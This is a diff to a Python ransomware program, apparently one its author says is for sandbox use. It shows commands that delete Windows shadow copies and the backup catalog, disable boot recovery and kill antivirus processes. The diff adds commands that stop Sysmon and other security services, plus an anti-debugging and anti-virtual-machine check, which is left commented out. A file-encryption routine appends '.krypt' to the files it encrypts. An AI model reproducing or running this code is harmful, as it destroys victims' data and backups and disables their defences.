@@ -87,10 +87,14 @@ def startup_commands_windows():
         "powershell -Command \"vssadmin delete shadows /all /quiet\"",
         "bcdedit /set {default} recoveryenabled No",
         "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
-        "wbadmin delete catalog -quiet", 
+        "wbadmin delete catalog -quiet",
         "taskkill /f /im MsMpEng.exe",
         "taskkill /f /im Sophos*",
-        "taskkill /f /im McAfee*"
+        "taskkill /f /im McAfee*",
+        "net stop SysmonLog",
+        "net stop SysmonDrv",
+        "net stop AVP*",
+        "net stop SEP*"
     ]
     
     for command in win_commands:
@@ -146,7 +150,7 @@ def encrypt_file(file_path, key):
         with open(file_path, 'wb') as file:
             file.write(encrypted_data)
             
-        rename_file_with_counter(file_path, '.krypt') # Just rename
+        rename_file_with_counter(file_path, '.krypt')
     except PermissionError:
         try:
             rename_file_with_counter(file_path, '.krypt') # Just rename
@@ -234,6 +238,24 @@ def parallel_search(drives, key):
         for future in futures:
             future.result()
 
+def check_debugging_and_virtualization():
+    # Detect debugging
+    debugging = ctypes.windll.kernel32.IsDebuggerPresent() != 0
+
+    # Detect virtualization
+    virtualization = False
+    try:
+        result = subprocess.run(["wmic", "computersystem", "get", "model"], capture_output=True, text=True, shell=True)
+        model = result.stdout.lower()
+        virtualization_keywords = ["virtual", "vmware", "vbox", "qemu", "xen"]
+        if any(keyword in model for keyword in virtualization_keywords):
+            virtualization = True
+    except:
+        pass
+
+    if debugging or virtualization:
+        sys.exit()  # Exit if debugging or virtualization detected
+
 # Zero out the key in memory several times
 def zero_memory(buffer):
     length = len(buffer)
@@ -286,6 +308,12 @@ def zero_and_unlock(mm, key_len, kernel_memory):
 
 # Main part, run all functions
 def main():
+    # Check if the machine is running in a debugging environment or a virtual machine.
+    # This is commonly done by real-life malware to evade analysis in sandboxes or virtualized environments.
+    # Since running on a sandbox is the only usage for this ransomware, I commented the function call out.
+    
+    # check_debugging_and_virtualization()
+    
     # Start up commands and kill switch check
     initial_check_kill()
     startup_commands_windows()
